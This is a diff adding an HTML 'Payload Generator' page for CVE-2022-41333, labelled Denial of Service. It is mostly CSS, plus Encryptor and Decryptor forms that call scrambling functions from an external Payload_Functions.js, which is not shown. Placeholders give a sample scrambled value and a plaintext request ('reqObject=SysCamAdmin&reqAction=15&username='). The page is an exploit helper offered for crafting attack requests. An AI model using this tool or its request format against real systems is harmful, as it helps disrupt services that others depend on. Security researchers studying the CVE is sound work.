@@ -1,0 +1,392 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<title>CVE-2022-41333 - Payload Generator</title>
+<head>
+  <style type="text/css">
+  html {
+    height: 100%;
+  }
+  body {
+    margin:0;
+    padding:0;
+    font-family: sans-serif;
+    background: linear-gradient(#141e30, #243b55);
+  }
+
+/* Decryptor CSS */
+/*------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
+  .dec-box {
+    position: absolute;
+    top: 20%;
+    left: 50%;
+    width: 800px;
+    padding: 40px;
+    transform: translate(-50%, -50%);
+    background: rgba(0,0,0,.5);
+    box-sizing: border-box;
+    box-shadow: 0 15px 25px rgba(0,0,0,.6);
+    border-radius: 10px;
+  }
+
+
+
+  .dec-box h2 {
+    margin: 0 0 30px;
+    padding: 0;
+    color: #640108;
+    text-align: center;
+  }
+
+  .dec-box .d-box {
+    position: relative;
+  }
+
+  .dec-box .d-box input {
+    width: 100%;
+    padding: 10px 0;
+    font-size: 16px;
+    color: #fff;
+    margin-bottom: 30px;
+    border: none;
+    border-bottom: 1px solid #fff;
+    outline: none;
+    background: transparent;
+  }
+  .dec-box .d-box label {
+    position: absolute;
+    top:0;
+    left: 0;
+    padding: 10px 0;
+    font-size: 16px;
+    color: #fff;
+    pointer-events: none;
+    transition: .5s;
+  }
+
+
+
+  .dec-box form a {
+    position: relative;
+    display: inline-block;
+    padding: 10px 20px;
+    color: #640108;
+    font-size: 16px;
+    text-decoration: none;
+    text-transform: uppercase;
+    overflow: hidden;
+    transition: .5s;
+    margin-top: 40px;
+    letter-spacing: 4px
+  }
+
+  .dec-box a:hover {
+    background: #640108;
+    color: #fff;
+    border-radius: 5px;
+    box-shadow: 0 0 5px #640108,
+                0 0 25px #640108,
+                0 0 50px #640108,
+                0 0 100px #640108;
+  }
+
+  .dec-box a span {
+    position: absolute;
+    display: block;
+  }
+
+  .dec-box a span:nth-child(1) {
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, #640108);
+    animation: btn-anim1 1s linear infinite;
+  }
+
+  @keyframes btn-anim1 {
+    0% {
+      left: -100%;
+    }
+    50%,100% {
+      left: 100%;
+    }
+  }
+
+  .dec-box a span:nth-child(2) {
+    top: -100%;
+    right: 0;
+    width: 2px;
+    height: 100%;
+    background: linear-gradient(180deg, transparent, #640108);
+    animation: btn-anim2 1s linear infinite;
+    animation-delay: .25s
+  }
+
+  @keyframes btn-anim2 {
+    0% {
+      top: -100%;
+    }
+    50%,100% {
+      top: 100%;
+    }
+  }
+
+  .dec-box a span:nth-child(3) {
+    bottom: 0;
+    right: -100%;
+    width: 100%;
+    height: 2px;
+    background: linear-gradient(270deg, transparent, #640108);
+    animation: btn-anim3 1s linear infinite;
+    animation-delay: .5s
+  }
+
+  @keyframes btn-anim3 {
+    0% {
+      right: -100%;
+    }
+    50%,100% {
+      right: 100%;
+    }
+  }
+
+  .dec-box a span:nth-child(4) {
+    bottom: -100%;
+    left: 0;
+    width: 2px;
+    height: 100%;
+    background: linear-gradient(360deg, transparent, #640108);
+    animation: btn-anim4 1s linear infinite;
+    animation-delay: .75s
+  }
+
+  @keyframes btn-anim4 {
+    0% {
+      bottom: -100%;
+    }
+    50%,100% {
+      bottom: 100%;
+    }
+  }
+/*------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
+
+/*Encryptor CSS*/
+/*------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
+.enc-box {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 800px;
+  padding: 40px;
+  transform: translate(-50%, -50%);
+  background: rgba(0,0,0,.5);
+  box-sizing: border-box;
+  box-shadow: 0 15px 25px rgba(0,0,0,.6);
+  border-radius: 10px;
+}
+
+
+
+.enc-box h2 {
+  margin: 0 0 30px;
+  padding: 0;
+  color: #32B15C;
+  text-align: center;
+}
+
+.enc-box .e-box {
+  position: relative;
+}
+
+.enc-box .e-box input {
+  width: 100%;
+  padding: 10px 0;
+  font-size: 16px;
+  color: #fff;
+  margin-bottom: 30px;
+  border: none;
+  border-bottom: 1px solid #fff;
+  outline: none;
+  background: transparent;
+}
+.enc-box .e-box label {
+  position: absolute;
+  top:0;
+  left: 0;
+  padding: 10px 0;
+  font-size: 16px;
+  color: #fff;
+  pointer-events: none;
+  transition: .5s;
+}
+
+.enc-box .e-box input:focus ~ label,
+.enc-box .e-box input:valid ~ label {
+  top: -20px;
+  left: 0;
+  color: #03e9f4;
+  font-size: 12px;
+}
+
+.enc-box form a {
+  position: relative;
+  display: inline-block;
+  padding: 10px 20px;
+  color: #32B15C;
+  font-size: 16px;
+  text-decoration: none;
+  text-transform: uppercase;
+  overflow: hidden;
+  transition: .5s;
+  margin-top: 40px;
+  letter-spacing: 4px
+}
+
+.enc-box a:hover {
+  background: #32B15C;
+  color: #fff;
+  border-radius: 5px;
+  box-shadow: 0 0 5px #32B15C,
+              0 0 25px #32B15C,
+              0 0 50px #32B15C,
+              0 0 100px #32B15C;
+}
+
+.enc-box a span {
+  position: absolute;
+  display: block;
+}
+
+.enc-box a span:nth-child(1) {
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, #32B15C);
+  animation: btn-anim1 1s linear infinite;
+}
+
+@keyframes btn-anim1 {
+  0% {
+    left: -100%;
+  }
+  50%,100% {
+    left: 100%;
+  }
+}
+
+.enc-box a span:nth-child(2) {
+  top: -100%;
+  right: 0;
+  width: 2px;
+  height: 100%;
+  background: linear-gradient(180deg, transparent, #32B15C);
+  animation: btn-anim2 1s linear infinite;
+  animation-delay: .25s
+}
+
+@keyframes btn-anim2 {
+  0% {
+    top: -100%;
+  }
+  50%,100% {
+    top: 100%;
+  }
+}
+
+.enc-box a span:nth-child(3) {
+  bottom: 0;
+  right: -100%;
+  width: 100%;
+  height: 2px;
+  background: linear-gradient(270deg, transparent, #32B15C);
+  animation: btn-anim3 1s linear infinite;
+  animation-delay: .5s
+}
+
+@keyframes btn-anim3 {
+  0% {
+    right: -100%;
+  }
+  50%,100% {
+    right: 100%;
+  }
+}
+
+.enc-box a span:nth-child(4) {
+  bottom: -100%;
+  left: 0;
+  width: 2px;
+  height: 100%;
+  background: linear-gradient(360deg, transparent, #32B15C);
+  animation: btn-anim4 1s linear infinite;
+  animation-delay: .75s
+}
+
+@keyframes btn-anim4 {
+  0% {
+    bottom: -100%;
+  }
+  50%,100% {
+    bottom: 100%;
+  }
+}
+
+/*------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
+</style>
+
+<script src="Payload_Functions.js" type="text/javascript"></script>
+<meta charset="utf-8">
+</head>
+<body>
+  <center>
+    <h1><strong><em><span style="color:#ffffff"><span style="background-color:#000000">Denial of Service</span></span></em></strong>&nbsp;<span style="color:#000000">//</span><strong><em><span style="color:#e74c3c">&nbsp;</span></em></strong><span style="color:#ffffff"><strong><span style="background-color:#e74c3c">CVE-2022-41333</span></strong></span></h1>
+
+    <p><span style="color:#ffffff"><span style="background-color:#e74c3c">- Mohammed Adel</span></span></p>
+  </center>
+<div class="dec-box">
+  <h2>Decryptor</h2>
+  <form>
+    <div class="d-box">
+      <input type="text" autocomplete="off" name="" placeholder=":B:JSsrJW16blB9dXp8ayJMZmxcfnJee3J2cTltem5efGt2cHEiLio5amx6bXF+cnoi" required="", id="decrypt">
+    </div>
+    <a onclick="decr(event)">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+      Decrypt
+    </a>
+    <script>
+    function decr(e) {
+      var enc_value = document.getElementById("decrypt").value;
+      FV_unscramble("fewRes="+enc_value, "0");
+    }
+  </script>
+  </form>
+</div>
+
+<div class="enc-box">
+  <h2>Encryptor</h2>
+  <form>
+    <div class="e-box">
+      <input type="text" autocomplete="off" name="" placeholder="reqObject=SysCamAdmin&reqAction=15&username=" required="", id="encrypt">
+    </div>
+    <a onclick="encr(event)">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+      Encrypt
+    </a>
+    <script>
+    function encr(e) {
+      var plain_value = document.getElementById("encrypt").value;
+      FV_scrambler(plain_value, "B", 0, 0);
+    }
+  </script>
+  </form>
+</div>
+</body>
+</html>
